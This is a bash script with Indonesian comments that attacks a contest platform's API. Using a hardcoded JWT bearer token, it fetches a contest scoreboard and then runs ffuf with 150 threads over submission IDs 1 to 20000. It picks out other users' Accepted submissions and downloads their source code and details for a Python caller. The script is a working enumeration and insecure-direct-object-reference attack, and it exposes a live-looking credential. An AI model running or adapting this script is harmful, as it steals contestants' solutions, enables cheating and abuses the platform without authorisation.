#!/bin/bash

TARGET_CID=$1
NUM_ACCEPTED=$2
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhcGktY29yZSIsImV4cCI6MjI5ODk3NTQ2NCwiaWF0IjoxNzc4OTkxNDY0LCJqdGkiOiI4MGIwZjZkNi04Yjc2LTQ4YjItOTQ4Ny03YjQ5MDE4NWQ2NmQiLCJJRCI6MTg0LCJGdWxsTmFtZSI6ImFyaXNlIiwiRW1haWwiOiJ4aWdhc283NzgxQGNvZG90ZWFtLmNvbSIsIlVzZXJUeXBlIjoicHVibGljIn0.VPDSv04H1HxqJ1oLU5gVp7Ix8I7_YC01DUNngdyNaJQ"

# Langsung tembak 1 Target CID dari Python (Tidak perlu di-loop lagi di sini)
score_data=$(curl -s "https://api.chronicles.sbs/core/v1/contest/scoreboard?contest_id=$TARGET_CID" -H "Authorization: Bearer $TOKEN")
    
participants=$(echo "$score_data" | jq -r '.result.scoreboard[].username' 2>/dev/null)
problems=$(echo "$score_data" | jq -r '.result.problems[].problem_id' 2>/dev/null)
s_type=$(echo "$score_data" | jq -r '.result.score_type // "ICPC"')

if [ -z "$participants" ] || [ "$participants" == "null" ]; then
    echo "NEXUS_EMPTY|Cluster $TARGET_CID kosong (Tidak ada partisipan)."
    exit 0
fi

# [DATA MAPPING] Menyimpan data dari Scoreboard ke dalam Array berurutan
readarray -t arr_uname < <(echo "$score_data" | jq -r '.result.scoreboard[].username')
readarray -t arr_uid < <(echo "$score_data" | jq -r '.result.scoreboard[].user_id')
readarray -t arr_score < <(echo "$score_data" | jq -r '.result.scoreboard[].score')
readarray -t arr_acc < <(echo "$score_data" | jq -r '.result.scoreboard[].total_accepted_problem')
readarray -t arr_pen < <(echo "$score_data" | jq -r '.result.scoreboard[].penalty')

# Data First Blood
top_user=${arr_uname[0]}
top_score=${arr_score[0]}
top_pen=${arr_pen[0]}

if [ -n "$top_user" ] && [ "$top_user" != "null" ]; then
    echo "NEXUS_TOP|$TARGET_CID|$top_user|$top_score|$top_pen"
fi

found_any_in_cluster=false

for pid in $problems; do
    # ⚡ JANGKAUAN DIPERLUAS: Cari SID dari 1 sampai 40000, Threads dinaikkan jadi 150
    ids_found=$(./ffuf -u "https://api.chronicles.sbs/core/v1/contest/submissions/details?contest_id=$TARGET_CID&submission_id=FUZZ" \
         -w <(seq 1 20000) -H "Authorization: Bearer $TOKEN" \
         -mr "\"status\":\"Accepted\".*\"problem_id\":$pid" \
         -t 150 -s | awk '{print $1}' | sort -n | head -n "$NUM_ACCEPTED")

    if [ -n "$ids_found" ]; then
        found_any_in_cluster=true
        idx=0 # Index untuk melacak urutan
        
        for id_found in $ids_found; do
            res=$(curl -s "https://api.chronicles.sbs/core/v1/contest/submissions/details?contest_id=$TARGET_CID&submission_id=$id_found" -H "Authorization: Bearer $TOKEN")
            
            c_name=$(echo "$res" | jq -r '.result.contest_name')
            p_title=$(echo "$res" | jq -r '.result.problem_title')
            
            # [OVERRIDE NULL] Ganti data API yang null dengan data Array Scoreboard sesuai urutan
            u_name=${arr_uname[$idx]}
            u_id=${arr_uid[$idx]}
            score=${arr_score[$idx]}
            total_acc=${arr_acc[$idx]}
            penalty=${arr_pen[$idx]}
            
            # Pengaman jika array habis
            if [ -z "$u_name" ] || [ "$u_name" == "null" ]; then u_name="Unknown"; fi
            if [ -z "$u_id" ] || [ "$u_id" == "null" ]; then u_id="0"; fi

            time_at=$(echo "$res" | jq -r '.result.created_at')
            lang=$(echo "$res" | jq -r '.result.language')
            b64_code=$(echo "$res" | jq -r '.result.source_code')
            p_id=$(echo "$res" | jq -r '.result.problem_id')
            try_c=$(echo "$res" | jq -r '.result.try_count // 1')
            sub_c=$(echo "$res" | jq -r '.result.submitted_count // 1')
            stat=$(echo "$res" | jq -r '.result.status // "Accepted"')
            
            # Kirim data ke Python
            echo "NEXUS_DATA|$c_name|$p_title|$u_name|$time_at|$lang|$id_found|$b64_code|$u_id|$score|$total_acc|$penalty|$p_id|$try_c|$sub_c|$stat|$s_type|$TARGET_CID"
            
            idx=$((idx + 1))
        done
    fi
done

if [ "$found_any_in_cluster" = false ]; then
    echo "NEXUS_NO_ACC|Cluster $TARGET_CID ada partisipan, tapi tidak ada yang Accepted."
fi
